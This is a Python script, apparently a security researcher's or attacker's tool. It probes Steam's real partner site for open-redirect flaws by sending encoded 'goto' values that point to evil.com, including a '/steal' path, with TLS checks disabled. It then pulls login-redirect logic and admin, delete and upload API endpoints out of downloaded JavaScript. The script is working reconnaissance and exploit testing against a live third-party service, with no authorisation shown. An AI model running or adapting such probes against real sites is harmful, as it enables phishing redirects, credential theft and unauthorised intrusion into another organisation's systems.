# -*- coding: utf-8 -*-
"""partner:goto 编码变体实测 + login dialog 逻辑 + 后台 JS 端点提取"""
import re
import sys
import ssl
import time
import urllib.parse
import urllib.request

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
BASE = "https://partner.steamgames.com"


def get(url, timeout=20):
    h = {'User-Agent': UA, 'Accept-Language': 'en-US,en;q=0.9'}
    r = urllib.request.Request(url, headers=h)
    try:
        resp = urllib.request.urlopen(r, context=CTX, timeout=timeout)
        return resp.status, resp.read(), dict(resp.headers), resp.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers), e.geturl()
    except Exception as e:
        return 0, str(e).encode(), {}, ''


def main():
    print("=" * 70)
    print("[D] goto 编码变体:登录对话框 URL 与 302 行为")
    print("=" * 70)
    gotos = [
        '%2F%2Fevil.com',              # 已知反射为 https://partner.steamgames.com/%2F%2Fevil.com
        '%2F%2Fevil.com%2Fsteal',
        'https:%2F%2Fevil.com',
        '%255c%255cevil.com',
        '%2F%5Cevil.com',
        '%3Fgoto%3D%2F%2Fevil.com',
    ]
    for g in gotos:
        s, body, h, final = get(BASE + "/?goto=" + g)
        loc = h.get('Location')
        txt = body.decode('utf-8', 'replace')
        # 找 g_ShowLoginDialog 里的 URL
        m = re.search(r'g_ShowLoginDialog\(\s*&quot;([^&]*)&quot;\s*\)', txt)
        dialog_url = m.group(1).replace('\\/', '/') if m else None
        print(f"goto={g!r:28s} -> {s} loc={loc} dialog={dialog_url}")
        time.sleep(0.5)

    # 直接访问反射出的 URL,看是否 302
    print()
    print("--- 直接访问反射出的登录对话框 URL ---")
    for u in [
        BASE + "/%2F%2Fevil.com",
        BASE + "/%2F%2Fevil.com%2Fsteal",
        BASE + "/https:%2F%2Fevil.com",
        BASE + "/%2F%5Cevil.com",
    ]:
        s, body, h, final = get(u)
        loc = h.get('Location')
        print(f"{u} -> {s} loc={loc} final={final[:80]}")
        time.sleep(0.5)

    print()
    print("=" * 70)
    print("[E] g_ShowLoginDialog 定义与校验逻辑")
    print("=" * 70)
    import os
    jsdir = r'D:\scan\_valve_next'
    for f in os.listdir(jsdir):
        if not f.endswith('.js'):
            continue
        txt = open(os.path.join(jsdir, f), encoding='utf-8', errors='replace').read()
        if 'g_ShowLoginDialog' in txt:
            print(f"--- {f} ---")
            for m in re.finditer(r'g_ShowLoginDialog', txt):
                i = m.start()
                print(f"   @{i}: ...{txt[max(0,i-200):i+300].replace(chr(10),' ')}...")
                print()
        if 'strRedirectURL' in txt or 'redirectURL' in txt:
            print(f"--- {f} redirectURL ---")
            for m in re.finditer(r'(?:strRedirectURL|redirectUrl)', txt):
                i = m.start()
                print(f"   @{i}: ...{txt[max(0,i-120):i+200].replace(chr(10),' ')}...")
                print()

    print()
    print("=" * 70)
    print("[F] 后台 JS 端点提取")
    print("=" * 70)
    import os
    from collections import Counter
    all_eps = Counter()
    jsdir = r'D:\scan\_valve_next'
    for f in os.listdir(jsdir):
        if not f.endswith('.js'):
            continue
        txt = open(os.path.join(jsdir, f), encoding='utf-8', errors='replace').read()
        for m in re.finditer(r'["\'](/[a-zA-Z][a-zA-Z0-9_/\-\.]*(?:admin|ajax|api|action|submit|edit|save|delete|create|update|upload)[a-zA-Z0-9_/\-\.]*)["\']', txt):
            ep = m.group(1)
            if len(ep) < 100 and not ep.endswith(('.js', '.css', '.gif', '.png', '.jpg')):
                all_eps[(f, ep)] += 1
    for (f, ep), c in all_eps.most_common(80):
        print(f"  {c:2d}x [{f}] {ep}")


if __name__ == '__main__':
    main()
